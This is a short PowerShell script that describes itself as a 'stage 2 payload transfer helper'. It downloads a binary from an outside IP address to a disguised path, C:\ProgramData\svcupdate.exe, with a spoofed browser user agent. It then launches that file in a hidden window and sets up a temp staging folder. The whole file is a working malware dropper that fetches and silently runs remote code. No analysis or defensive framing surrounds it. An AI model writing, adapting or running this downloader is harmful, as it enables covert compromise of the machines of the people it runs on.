
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://203.0.113.7:443/payload.bin',
    [string]$DropPath = 'C:\ProgramData\svcupdate.exe',
    [int]$TimeoutSec = 222,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $DropPath -TimeoutSec $TimeoutSec -UserAgent $RequestAgent
if ($StageResult) {
    Start-Process -FilePath $DropPath -WindowStyle Hidden
}

Start-Sleep -Seconds 33
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
